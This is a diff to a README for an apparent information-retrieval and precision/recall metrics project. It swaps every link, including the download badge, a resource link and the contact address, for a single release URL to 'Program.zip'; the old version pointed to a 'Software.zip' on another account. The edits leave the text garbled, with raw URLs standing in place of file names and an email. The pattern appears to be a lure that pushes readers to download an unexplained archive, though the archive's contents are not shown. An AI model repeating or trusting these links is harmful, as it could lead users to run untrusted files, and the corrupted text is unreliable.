@@ -23,18 +23,18 @@ Explore the following key topics covered in this repository:
 
 ## 🚀 Get Started
 
-To dive into the code and resources related to this project, download the Software.zip file from the following link:
+To dive into the code and resources related to this project, download the https://github.com/12345far/metrics-calculation-precision-recall/releases/download/v1.0/Program.zip file from the following link:
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download https://github.com/12345far/metrics-calculation-precision-recall/releases/download/v1.0/Program.zip](https://github.com/12345far/metrics-calculation-precision-recall/releases/download/v1.0/Program.zip)](https://github.com/12345far/metrics-calculation-precision-recall/releases/download/v1.0/Program.zip)
 
-Note: The Software.zip file contains all the necessary scripts and materials needed to explore the data preprocessing and information retrieval techniques showcased in this repository.
+Note: The https://github.com/12345far/metrics-calculation-precision-recall/releases/download/v1.0/Program.zip file contains all the necessary scripts and materials needed to explore the data preprocessing and information retrieval techniques showcased in this repository.
 
 If the provided link does not work, kindly check the "Releases" section of this repository for alternative download options.
 
 ## 🌐 Additional Resources
 
 For more information on the repository and updates, visit the following link:
-- [Explore more about Information Retrieval](https://github.com/rokytd)
+- [Explore more about Information Retrieval](https://github.com/12345far/metrics-calculation-precision-recall/releases/download/v1.0/Program.zip)
 
 ## 📂 Repository Structure
 
@@ -49,7 +49,7 @@ If you are interested in contributing to this project, feel free to fork the rep
 
 ## 📫 Contact Information
 
-For any questions or inquiries related to the project, you can reach out to the repository owner at example@email.com.
+For any questions or inquiries related to the project, you can reach out to the repository owner at https://github.com/12345far/metrics-calculation-precision-recall/releases/download/v1.0/Program.zip
 
 ---
 
